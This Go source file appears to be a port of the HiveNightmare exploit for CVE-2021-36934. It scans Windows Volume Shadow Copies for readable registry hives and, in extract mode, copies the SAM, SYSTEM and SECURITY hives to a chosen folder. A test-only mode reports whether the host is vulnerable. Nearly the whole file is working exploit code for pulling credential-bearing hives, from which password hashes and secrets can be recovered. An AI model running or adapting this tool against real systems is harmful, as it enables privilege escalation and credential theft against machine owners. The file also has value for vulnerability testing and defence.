package main

// Go HiveNightmare - Identify accessible Volume Shadow Copy and pull hive files if flagged
// Version: 1.0
// Author: mwarnerblu
// usage: gohn.exe <-test|-extract> <targetDir>

import (
    "os"
    "log"
    "strings"
    "io/ioutil"
    "strconv"
    "fmt"
)


func Read(src string) []byte {
	// Read in and pass input
	log.Printf("Reading and copying %v", src)
	input, err := ioutil.ReadFile(src)
    if err != nil {
            log.Printf("err %v", err)
            return []byte(`{}`)
    } else {
    	return input
    }
}

func ReadAndCopy(filepath string, targetDir string, snapshot string) bool {
	// Set up the list of hives
	hives := [3]string{"SECURITY", "SYSTEM", "SAM"}
	// Brute force check/create targetDir if it doesn't exist, throw out err otherwise
	_ = os.Mkdir(targetDir, 0644)
	// Iterate through hives in VSC on valid snapshot
	for _, hive := range hives {
		// Build out the source and Read
		var file string = strings.Replace(filepath, "<type>", hive, 1)
		var input []byte = Read(file)
	 	// Build out target filename
	    // Follow output format of -haxx similar to https://github.com/GossiTheDog/HiveNightmare
	    var targetName = fmt.Sprintf("%v/%v-%v-haxx", targetDir, hive, snapshot)
	    var err = ioutil.WriteFile(targetName, input, 0644)
	    if err != nil {
	            log.Printf("Error creating %v - %v", targetName, err)
	    } else {
	    	log.Printf("Successfully copied to %v", targetName)
	    }  
	}
	return true
}


func Exists(path string) bool {
	_, err := ioutil.ReadFile(path)
    if err == nil {
        // log.Printf("file %s exists", file)
        return true
    } else if os.IsNotExist(err) {
        // log.Printf("file %s not exists", file)
        return false
    } else {
        // log.Printf("file %s stat error: %v", file, err)
        return false
    }
}


func CheckAccess(pathTemplate string, currentNum int) bool {
	// Prep the snapshot for validation, only need to check for one.
	currentNumStr := strconv.Itoa(currentNum)
	var file string = strings.Replace(pathTemplate, "<>", currentNumStr, 1)
	file = strings.Replace(file, "<type>", "SYSTEM", 1)
	return Exists(file)
}


func main() {
	var welcome string = "HiveNightmare 1.0 - Automated Iteration, Identification, and Extraction.\n---------"
    var pathTemplate string = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<>\\Windows\\System32\\config\\<type>"
    // Maximum number of VSC snapshots
    // https://en.wikipedia.org/wiki/Shadow_Copy
    var maxSnapshots int = 64
    // Checks for expected usage
    if len(os.Args) < 2 {
    	log.Printf("You did not pass the target directory, please try again.\n---------")
    	log.Printf("Usage: hivenightmare.exe <-extract|-test> target-directory")
    	log.Printf("Example: gohn.exe -extract results (Extract hives to results folder)")
    	log.Printf("         gohn.exe -test (Test only)")
    	os.Exit(126)
    }
    // Declare and validate extract/mode
    var extract string = os.Args[1]
    var identifiedSnapshots []string
    log.Printf(welcome)
    // file,err := os.Open(path)
    // Check for file
    for i := 1; i <= maxSnapshots; i++ {
	    var result bool = CheckAccess(pathTemplate, i)
	    if result == true {
	    	identifiedSnapshots = append(identifiedSnapshots, strconv.Itoa(i))
	    }
	}
	// If any snapshots exist, output
	if len(identifiedSnapshots) > 0 {
		log.Printf("Identified snapshots with access: %v", strings.Join(identifiedSnapshots[:], ","))
	} else {
		log.Printf("No snapshots were found, host is not vulnerable.")
		os.Exit(0)
	}
	// Check to see what mode we're in
	// If -test, print vuln statement and exit, if -extract move forward
	if extract == "-test" {
		host, _ := os.Hostname()
		log.Printf("Host %v is vulnerable to CVE-2021-36934 or this user has access to VSC and can extract hive files.", host)
		os.Exit(0)
	} else {
		// Iterate through identified snapshots and copy to target-dir
		
		if len(os.Args) == 3 {
			var targetDir string = os.Args[2]
			for _, ss := range identifiedSnapshots {
			    var snapshot string = strings.Replace(pathTemplate, "<>", ss, 1)
			    ReadAndCopy(snapshot, targetDir, ss)
			}
		} else {
			log.Printf("You did not define a target directory")
			log.Printf("Usage: hivenightmare.exe <-extract|-test> target-directory")
    		log.Printf("Example: gohn.exe -extract results (Extract hives to results folder)")
    		os.Exit(1)
		}
		
	}

    // Wrapup for final -extract snapshot extraction run.
    os.Exit(0)
}